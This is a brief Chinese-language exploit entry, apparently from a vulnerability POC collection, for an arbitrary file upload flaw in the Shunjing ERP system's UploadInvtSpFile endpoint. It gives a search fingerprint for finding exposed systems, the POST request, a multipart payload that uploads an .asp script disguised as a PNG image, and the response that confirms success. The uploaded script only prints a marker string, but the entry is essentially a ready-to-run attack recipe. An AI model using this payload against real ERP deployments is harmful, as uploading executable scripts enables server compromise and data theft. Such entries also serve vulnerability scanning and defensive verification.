# 顺景ERP管理系统UploadInvtSpFile任意文件上传漏洞

顺景ERP管理系统UploadInvtSpFile ｜ 文件上传 ｜ —
- **指纹**：`body="/api/DBRecord/getDBRecords"`
- **请求**：`POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1`

**Payload**
```
-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="filedata"; filename="abc123.asp"
Content-Type: image/png
<% response.write("drwc2nymcirgr7r2bdgb111")%>
-----------------------------45250802924973458471174811279
```
- **响应特征**：200 abc123.asp